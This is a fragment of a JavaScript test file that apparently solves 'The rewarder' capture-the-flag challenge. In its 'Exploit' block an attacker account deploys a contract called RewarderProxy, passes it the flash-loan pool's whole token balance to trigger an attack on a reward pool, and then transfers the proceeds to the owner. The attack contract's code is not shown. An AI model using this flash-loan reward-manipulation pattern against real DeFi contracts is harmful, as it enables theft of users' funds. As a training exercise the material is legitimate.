...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const MaliciousFactory = await ethers.getContractFactory('RewarderProxy');  
        const maliciousContract = await MaliciousFactory.connect(attacker).deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);
       
        let amount = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
        let transaction = await maliciousContract.triggerAttack(amount);
        await transaction.wait();

        transaction = await maliciousContract.transferToOwner(amount);
        await transaction.wait();
